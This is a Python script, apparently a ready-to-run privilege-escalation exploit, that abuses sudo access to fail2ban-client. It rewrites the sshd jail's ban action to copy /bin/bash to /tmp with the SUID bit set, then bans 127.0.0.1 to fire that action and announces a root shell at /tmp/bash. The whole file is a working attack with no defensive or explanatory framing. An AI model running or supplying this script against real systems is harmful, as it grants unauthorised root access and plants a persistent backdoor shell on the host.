import os
import subprocess
import sys

def is_sudo_accessible():
    """Check if the user can run fail2ban-client with sudo."""
    try:
        result = subprocess.run(['sudo', '-n', 'fail2ban-client', 'status'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return True
        else:
            print("You do not have the necessary permissions to run fail2ban-client with sudo.")
            return False
    except FileNotFoundError:
        print("fail2ban-client is not installed on this system.")
        return False

def run_command(command):
    """Run a shell command."""
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(f"Error running command: {command}")
            print(result.stderr.decode())
        else:
            print(result.stdout.decode())
    except Exception as e:
        print(f"An error occurred while running command: {command}\n{str(e)}")

def main():
    if not os.name == 'posix':
        print("This script is designed to run on a Linux machine.")
        sys.exit(1)

    if not is_sudo_accessible():
        sys.exit(1)

    print("Restarting fail2ban...")
    run_command("sudo /usr/bin/fail2ban-client restart")

    print("Setting actionban for SSHD to copy bash to /tmp and set SUID bit...")
    command = (
        "sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "
        "\"/bin/bash -c 'cp /bin/bash /tmp && chmod 4755 /tmp/bash'\""
    )
    run_command(command)

    print("Banning IP 127.0.0.1 to trigger the action...")
    run_command("sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1")

    print("âœ… Done. You can now run /tmp/bash to get root shell (if it worked).")

if __name__ == "__main__":
    main()